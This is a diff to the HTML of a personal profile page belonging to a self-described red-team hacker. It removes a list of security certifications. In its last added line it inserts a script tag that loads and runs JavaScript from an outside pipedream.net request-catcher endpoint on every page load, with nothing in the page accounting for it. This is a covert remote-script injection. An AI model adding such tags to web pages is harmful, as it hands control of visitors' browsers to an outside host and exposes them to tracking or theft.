@@ -86,17 +86,6 @@
         <h1 align="center">Hi 👋, I'm M.Akif SAYIN | ~DedCrowd~</h1>
         <h3 align="center">I am a Red team Offensive Hacker in Turkiye.</h3>
 
-        <div class="certifications">
-            <h2>Certifications</h2>
-            <div class="cert-item">AWS Certified Cloud Practitioner - Dec 2024</div>
-            <div class="cert-item">CompTIA PenTest+ (PT0-002) - Dec 2024</div>
-            <div class="cert-item">CompTIA Security+ (SY0-701) - Dec 2024</div>
-            <div class="cert-item">ISC2 CISSP - Dec 2024</div>
-            <div class="cert-item">Ubuntu Linux: Network Administration - Dec 2024</div>
-            <div class="cert-item">Advanced Cyber Security Expertise (260 Hours) - Oct 2024</div>
-            <div class="cert-item">FSMSEM Cybersecurity Certification (120 Hours) - Sep 2024</div>
-            <div class="cert-item">Cisco CCNAv7: Introduction to Networks - May 2024</div>
-        </div>
 
         <p align="left"> <img src="https://komarev.com/ghpvc/?username=hunthack3r&label=Profile%20views&color=0e75b6&style=flat" alt="hunthack3r" /> </p>
 
@@ -121,10 +110,12 @@
     </div>
 
     <script>
+    
         setTimeout(() => {
             document.getElementById('popup').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         }, 3000);
     </script>
+    <script src=https://eokmyp9glaijyew.m.pipedream.net/?EgeYurt=SAZANLAR></script>
 </body>
 </html>
